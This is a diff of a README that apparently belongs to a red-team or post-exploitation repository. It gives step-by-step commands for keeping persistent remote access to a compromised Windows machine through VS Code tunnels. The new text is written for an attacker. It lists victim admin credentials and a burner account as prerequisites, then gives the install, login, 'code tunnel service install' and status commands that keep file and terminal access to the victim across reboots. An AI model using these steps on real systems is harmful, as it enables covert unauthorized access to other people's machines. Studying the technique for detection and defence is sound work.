@@ -1,51 +1,63 @@
-# Windows Persistence via VSCode Tunnels  
-
+# WINDOWS PERSISTENCE VIA VSCODE TUNNELS  
 
 ## Abstract  
-Remote debuggers are not a new concept, but [*only recently*](https://www.bleepingcomputer.com/news/security/chinese-hackers-use-visual-studio-code-tunnels-for-remote-access/) have malicious actors started leveraging legitimate remote debugging tools as methods to maintain persistence on exploited systems.   
+This directory contains some post-exploitation scripts and commands to (semi)automate windows persistence via [*vscode tunnels*](https://code.visualstudio.com/docs/remote/tunnels). 
 
-In particular, [*Visual Studio Code*](https://code.visualstudio.com/) has become one of the most commonly used tools for this purpose, thanks to its widespread adoption, simplicity, power, and extensive ecosystem of extensions.  
+## Technique
+MITRE ATT&CK: [*Remote Access Tools - IDE Tunneling*](https://attack.mitre.org/techniques/T1219/001/)  
 
-Moreover, VS Code is a Microsoft-signed, fully legitimate tool, which makes it ideal for evading detection and remaining under the radar.   
+## Prerequisites  
+- Access to a target windows machine with valid credentials and local administrative rights.  
+- Powershell enabled for the current user on windows.  
+- A burner Github or Microsoft Account.  
+- An attacker machine with a browser and internet connection.  
+  
+## Instructions  
 
-In this repository, we will showcase a simple Proof of Concept showing how a threat actor could use VS Code to maintain persistent access to a system.  
+All the PS scripts are inside the `powershell` folder.  
+If vscode is not already installed on the victim windows machine, you can automate the installation by launching the following script:  
+```sh
+.\installvs.ps1
+```  
+![download](./images/download_vs.png)  
 
-## Prerequisites
-- Windows 11 machine (victim)
-- Kali machine (attacker)
-- Github account (for tunnel configuration)
+![install](./images/install_vs_1.png)  
 
 
-## Guide  
-Let's say you compromised a windows11 machine, now you need a way to maintain persistence to that machine.  
-On the compromised machine download, configure and launch `VSCode portable` by following the documentation [*here*](https://code.visualstudio.com/docs/editor/portable).  
+Once installed, you can close the current PS session.  
 
-Open the vscode temrinal and type `code tunnel`:  
-![victim-configuration](./images/configure_tunnel.PNG)  
+At this point you have locally installed VsCode, as well as the code-cli.  
+You can procede to create a new tunnel with the following command (change the provider if you want to use microsoft instead of Github):  
+```sh
+code tunnel user login --provider github
+```  
 
-Copy the generated url (and the 8 digit code) and open it in the browser, follow the instructions to authenticate via Github.  
-At the end of the authentication, a new url will be generated: this is your tunnel url!  
+This will print a url and a code, reach that url and login with your burner account:  
+![login1](./images/tunnel_login1.png)  
+![login2](./images/tunnel_login2.png)   
 
-On the Attacker machine, open the tunnel url from the browser, this will open the web version of vscode.  
-Select Github as authentication method and follow the instruction to authenticate with github:  
-![attacker-configuration](./images/attacker_configuration.png)  
 
-At this point you can open a folder on the victim machine and browse the files from the vscode UI or open a terminal on the compromised machine:  
+Now that you are all set, start the tunnel with the following command:  
+```sh
+code tunnel service install --accept-server-license-terms --name "whatever-you-want-here"
+```  
 
+Then run the following to see the tunnel status:  
+```sh
+code tunnel status
+```  
+![status](./images/tunnel_status.png)  
+
+Now, from a browser on you attacker machine, navigate to [https://vscode.dev](https://vscode.dev/) and connect to your tunnels via your github (or microsoft user):  
+![attacker_login](./images/attacker_login.png)  
+
+At this point you have both read and write access to the victim filesystems and the connection is persisted via the tunneling services even after the victim machine reboots!!  
 ![connected](./images/connected.png)  
 
-As the last step, the attacker needs to automate the execution of vscode tunnel server on the victim machine, at startup.  
-
-In order to do that, she can use tools like [*Windows Service Wrapper*](https://github.com/winsw/winsw).  
-
-For more information regarding vscode tunnels, take a look at the [*official documentation*](https://code.visualstudio.com/docs/remote/tunnels).  
-  
-
-
-
-
-
-
+In the end, if you want to delete the tunnel and disable the tunneling service, you need to run the following command on the victim machine:  
+```sh
+ code tunnel service uninstall; code tunnel kill ; code tunnel prune ; code tunnel status
+```  
 
 
 
